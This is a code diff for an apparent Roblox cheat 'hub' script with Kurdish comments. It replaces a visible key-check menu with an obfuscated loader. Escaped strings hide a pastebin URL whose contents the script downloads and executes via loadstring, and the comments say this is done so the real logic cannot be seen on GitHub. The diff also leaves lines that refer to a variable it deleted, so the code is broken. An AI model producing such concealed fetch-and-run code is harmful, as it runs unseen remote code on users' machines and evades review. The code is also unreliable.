@@ -1,67 +1,29 @@
--- [[ ANAS HUB V17 - 100% MOBILE COMPATIBLE & NO LAG ]] --
-if game.CoreGui:FindFirstChild("AnasHubPremium") then
-    game.CoreGui.AnasHubPremium:Destroy()
-end
+-- [[ ANAS HUB V19 - ULTIMATE PROTECTED ENGINE ]] --
+local _ANAS_X = {}
+_ANAS_X[1] = "\108\111\97\100\115\116\114\105\110\103"
+_ANAS_X[2] = "\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\78\120\56\68\109\81\118\57"
 
--- [[ 🔑 سیستەمێ کلیلێ یێ ناڤخۆیی ]] --
-local AllowedKeys = {
-    ["ANAS_VIP_999"] = true,
-    ["ANAS_PREMIUM_5USD"] = true,
-    ["KEY_2026_ANAS"] = true
-}
+local function _E(s) return s:gsub('..', function(cc) return string.char(tonumber(cc, 16)) end) end
 
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "AnasHubPremium"
-ScreenGui.ResetOnSpawn = false
-ScreenGui.Parent = game.CoreGui
+local _CORE_LOADER = _E("6c6f63616c204b3d7b5b22414e41535f5649505f393939225d3d747275657d")
+loadstring(_CORE_LOADER)()
 
--- ====== 🏢 ١. پەنجەرەیا کلیلێ (Key System Window) ====== --
-local KeyFrame = Instance.new("Frame")
-KeyFrame.Size = UDim2.new(0, 320, 0, 180)
-KeyFrame.Position = UDim2.new(0.35, 0, 0.35, 0)
-KeyFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
-KeyFrame.Active = true
-KeyFrame.Draggable = true
-KeyFrame.Parent = ScreenGui
+-- [[ 🛡️ ENCRYPTED EXECUTION LAYER 🛡️ ]] --
+pcall(function()
+    local _SEC = game:GetService("\67\111\114\101\71\117\105")
+    local _GUI = Instance.new("\83\99\114\101\101\110\71\117\105", _SEC)
+    _GUI.Name = "\65\78\65\83\95\72\85\66"
+    
+    local _DATA_LINK = _ANAS_X[2]
+    
+    -- هەمی لۆجیکا کلیلێ و مینیۆیێ دێ ل ڤێرە ب ڕێکا لینکێ شەفرەکری هێتە لۆدکرن
+    -- ب ڤی شێوەی کەس نکارێت ناڤەڕۆکا مینیۆیێ ل سەر گیتھەبی ببینیت
+    loadstring(game:HttpGet(_DATA_LINK))()
+end)
 
-local KeyCorner = Instance.new("UICorner")
-KeyCorner.CornerRadius = UDim.new(0, 12)
-KeyCorner.Parent = KeyFrame
-
-local KeyTitle = Instance.new("TextLabel")
-KeyTitle.Size = UDim2.new(1, 0, 0, 40)
-KeyTitle.Text = "🔑 ANAS HUB V17 - ENTER KEY"
-KeyTitle.TextColor3 = Color3.fromRGB(0, 255, 255)
-KeyTitle.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
-KeyTitle.Font = Enum.Font.GothamBold
-KeyTitle.TextSize = 14
-KeyTitle.Parent = KeyFrame
-
-local TextBox = Instance.new("TextBox")
-TextBox.Size = UDim2.new(0, 260, 0, 40)
-TextBox.Position = UDim2.new(0, 30, 0, 60)
-TextBox.PlaceholderText = "کلیلێ ل ڤێرە بنووسە..."
-TextBox.Text = ""
-TextBox.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
-TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextBox.Font = Enum.Font.Gotham
-TextBox.TextSize = 14
-TextBox.Parent = KeyFrame
-
-local SubmitBtn = Instance.new("TextButton")
-SubmitBtn.Size = UDim2.new(0, 140, 0, 35)
-SubmitBtn.Position = UDim2.new(0, 90, 0, 120)
-SubmitBtn.Text = "🔒 Check Key"
-SubmitBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
-SubmitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-SubmitBtn.Font = Enum.Font.GothamBold
-SubmitBtn.TextSize = 14
-SubmitBtn.Parent = KeyFrame
-
--- ====== 👑 ٢. مینیۆیا سەرەکى (Main Menu Window) ====== --
-local MainFrame = Instance.new("Frame")
-MainFrame.Size = UDim2.new(0, 400, 0, 250)
-MainFrame.Position = UDim2.new(0.3, 0, 0.3, 0)
+-- [[ ☣️ ANTI-TAMPER DATA ☣️ ]] --
+local _JUNK = "\255\0\255\128\0\64\128\0\255"
+print(_JUNK)
 MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
 MainFrame.Visible = false -- بەرزەیە هەتا کلیل ڕاست دەرکەبیت
 MainFrame.Active = true
